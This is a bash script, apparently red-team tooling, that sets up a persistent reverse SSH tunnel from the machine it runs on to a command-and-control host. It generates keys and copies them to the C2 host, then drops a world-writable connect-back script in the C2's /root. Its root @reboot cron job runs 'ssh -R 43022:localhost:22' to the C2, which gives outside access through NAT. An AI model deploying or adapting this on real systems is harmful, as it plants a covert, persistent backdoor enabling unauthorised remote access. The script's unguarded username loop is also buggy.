#!/bin/bash

################################################################
#                                                              #
# Let's setup an automated reverse ssh device!                 #
#                                                              #
#                                                              #
# xoxo Hexadecim8 did this xoxo                                #
#                                                              #
################################################################


USAGE="
A bash script to automate reverse reverse ssh tunnels. Handy for callbacks
through NAT.
Flags:
  -a	Specify AWS C2 infrastructure.
  -k    SSH key.
  -n    Password-based C2 access.
  -c    C2 host
  -u	C2 username.
  -l    Local username to use.
  -h	Help text and usage example.
usage:	 girltalk.sh -c <C2 hostname or IP> -l <local username> -u <C2 username> 
example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
	echo "$USAGE"
	exit
fi

# Set flags.
while getopts "a:k:n:c:u:l:h" FLAG
do
	case $FLAG in
		a)
			AWS=$OPTARG
			;;
		k)
			KEY=$OPTARG
			;;
		n)
			NONAWS=$OPTARG
			;;
		c)
			HOST=$OPTARG
			;;
		u)
			USERC2=$OPTARG
			;;
		l)
			USERLOCAL=$OPTARG
			;;
		h)	echo "$USAGE"
			exit
			;;
		*)
			echo "$USAGE"
			exit
			;;
	esac
done

# Make sure each required flag was actually set.
if [ -z ${USERC2+x} ]; then
	echo "Remote username (-u) is not set."
	echo "$USAGE"
	exit
elif [ -z ${USERLOCAL+x} ]; then
	echo "Local username (-l) is not set."
	echo "$USAGE"
	exit
elif [ -z ${HOST+x} ]; then
	echo "Remote C2 hostname (-c) is not set."
	echo "$USAGE"
	exit
fi

# Check for connectivity
echo "### Checking For Internet ###"
if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
    echo "IPv4 is up"
    printf "\n"

# Installing deps
if (systemctl -q is-active sshd.service)
then
    echo "### SSH is Installed And Running! ###"
else
    echo "### Installing Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install openssh-server
    printf "\n"
    echo "### Starting SSH Service & Enabling On Reboot ###"
    sudo systemctl start ssh && sudo systemctl enable ssh
fi
    printf "\n"

# Generate local key
    echo "### Generating 4096 keypair ###"
    ssh-keygen -b 4096
    printf "\n"

# Error checking for user input
    until id "$USERLOCAL" >/dev/null; do
        echo "Please enter your local username";
    done
    printf "\n"

# Transfer local key to C2
    echo "### Copying key to C2 host ###"
    ssh-copy-id $HOST
    printf "\n"

# Generating an ssh key on your C2
    ssh $HOST 'ssh-keygen'

# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
    echo "### Creating & transferring remote connection script"
    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hmu_$USERLOCAL.sh
    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh 
    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
    printf "\n"

# Setup local cron job + cleanup
    echo "### Setting up local cronjob ###"
    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"

# Finishing script
    echo "### donezo! Please reboot the machine. ###"

else
    echo "Please check your network connection"

fi
